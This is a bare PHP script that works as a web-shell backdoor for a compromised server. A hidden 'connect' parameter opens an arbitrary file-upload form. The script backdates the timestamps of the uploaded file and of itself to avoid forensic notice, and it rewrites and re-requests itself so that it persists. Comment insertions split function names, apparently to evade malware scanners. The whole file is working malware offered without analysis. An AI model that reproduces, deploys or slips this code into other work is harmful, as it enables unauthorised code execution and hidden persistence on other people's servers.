<?php
error_reporting(0);
ignore_user_abort(1);
$Name = basename(__FILE__);
$a = file_get_contents($Name);
$url = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
if (isset($_REQUEST['connect'])) {
    $name = "name";
    $tname = "tmp"./*;*/"_"./*;*/$name;
    $fname = "file"./*;*/$name;
    ?>
<html>
<body>
<form method="post" enctype="multipart/form-data">
<input type="file" name="<?php echo $fname; ?>">
<input type="submit">
</form>
<?php
if (!empty($_FILES) && is_uploaded_file/*;*/($_FILES[$fname][$tname])) {
    move_uploaded_file/*;*/($_FILES[$fname][$tname], $_FILES[$fname][$name]);
    $file = $_FILES/*;*/[$fname][$name];
    $filename = $_SERVER['SCRIPT_FILENAME'];
    $time = time/*;*/() - (400 * rand(20, 28) * 60 * 60);
    touch/*;*/($filename, $time);
    touch/*;*/($file, $time);
    ?><a href="<?php echo $file; ?>"><?php echo $file; ?></a><?php
}
?>
</body>
</html>
<?php
    exit();
}
for ($i = 0; $i <= 3; $i ++) {
    if ($i == 1) {
        file_put_contents($Name, $a);
        sleep(10);
    } elseif ($i == 2) {
        file_put_contents($Name, $a);
        sleep(10);
    } elseif ($i == 3) {
        sleep(10);
        file_put_contents($Name, $a);

        $cur = curl_init();
        curl_setopt($cur, CURLOPT_URL, $url);
        curl_setopt($cur, CURLOPT_TIMEOUT, 15);
        curl_setopt($cur, CURLOPT_RETURNTRANSFER, 1);
        curl_exec($cur);
        curl_close($cur);
        exit();
    }
} 
